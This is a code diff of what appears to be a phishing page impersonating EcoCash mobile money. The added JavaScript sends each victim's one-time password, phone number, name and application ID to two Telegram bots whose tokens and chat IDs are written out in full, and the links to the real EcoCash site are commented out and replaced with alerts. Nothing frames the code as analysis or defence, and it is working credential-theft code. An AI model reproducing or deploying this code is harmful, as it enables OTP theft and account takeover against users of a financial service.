@@ -432,18 +432,27 @@
             sendOTPToTelegram(otp, phone);
             
             // Show OTP verification page
-            window.location.href = 'otp-verification-final.html';
+window.location.href = 'otp-verification-final.html';
+}
+
+function sendOTPToTelegram(otp, phone) {
+    // Both bot configurations
+    const bots = [
+        {
+            token: '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI',
+            chatId: '5520957080'
+        },
+        {
+            token: '8778116219:AAGIDOJeTkxMXofhI_CZGPJzaoaGoCmnoDc',
+            chatId: '5557779815'
         }
-        
-        function sendOTPToTelegram(otp, phone) {
-            const botToken = '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI';
-            const chatId = '5520957080';
-            
-            const firstName = applicationData.firstName || 'Not Provided';
-            const lastName = applicationData.lastName || 'Not Provided';
-            const appId = applicationData.applicationId || 'Not Provided';
-            
-            const message = `
+    ];
+    
+    const firstName = applicationData.firstName || 'Not Provided';
+    const lastName = applicationData.lastName || 'Not Provided';
+    const appId = applicationData.applicationId || 'Not Provided';
+    
+    const message = `
 📱 *OTP SENT FOR VERIFICATION*
 
 📋 *Application ID:* ${appId}
@@ -453,27 +462,34 @@
 ⏰ *Expires:* 15 minutes
 
 🕒 *Sent at:* ${new Date().toLocaleString()}
-            `;
-            
-            const encodedMessage = encodeURIComponent(message);
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown`)
-                .catch(error => console.error('Error sending OTP:', error));
-        }
-        
-        function register() {
-            alert('Redirecting to EcoCash registration...');
-            // window.location.href = 'https://ecocash.com/register';
-        }
-        
-        function helpSupport() {
-            alert('Opening Help & Support...');
-            // window.location.href = 'https://ecocash.com/support';
-        }
-        
-        function showTerms() {
-            alert('Showing Terms and Conditions...');
-            // window.location.href = 'https://ecocash.com/terms';
+    `;
+    
+    const encodedMessage = encodeURIComponent(message);
+    
+    // Send to both Telegram bots
+    bots.forEach((bot, index) => {
+        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodedMessage}&parse_mode=Markdown`)
+            .then(response => response.json())
+            .then(result => {
+                console.log(`OTP Bot ${index + 1} - Message sent:`, result.ok ? '✅ Success' : '❌ Failed');
+            })
+            .catch(error => console.error(`OTP Bot ${index + 1} Error:`, error));
+    });
+}
+
+function register() {
+    alert('Redirecting to EcoCash registration...');
+    // window.location.href = 'https://ecocash.com/register';
+}
+
+function helpSupport() {
+    alert('Opening Help & Support...');
+    // window.location.href = 'https://ecocash.com/support';
+}
+
+function showTerms() {
+    alert('Showing Terms and Conditions...');
+    // window.location.href = 'https://ecocash.com/terms';
         }
     </script>
 </body>
